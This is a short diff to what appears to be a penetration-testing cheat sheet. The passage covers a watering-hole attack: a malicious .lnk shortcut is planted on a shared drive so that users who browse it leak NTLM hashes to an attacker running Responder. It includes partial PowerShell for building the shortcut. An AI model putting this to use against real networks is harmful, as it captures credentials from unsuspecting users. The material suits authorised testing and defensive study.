@@ -253,7 +253,7 @@ In this scenario, we have the ability to setup a watering hole attack. By genera
 This can be used in the event when we are having trouble gaining further access or elevating priviliges. However we have access to a network file share. If the lnk can be succesfully placed in this shared location, anyone that access it (Automaticl refresh) it will execute the lnk with the commnands sent back to the attacking machine.  
 
 1. Run Admin Powershell command to create lnk for hash captures:
-2. Run Responder for HASH CAPTURE not RELAY
+2. Run Responder for HASH CAPTURE not RELAY (WPAD OFF)
      
         $objShell = New-Object -ComObject WScript.shell // objshell variable set tp wscript.shll
         $lnk = $objShell.CreateShortcut("C:\test.lnk") // shortcut for objshell is placed in C:\ or any share drive as test.lnk
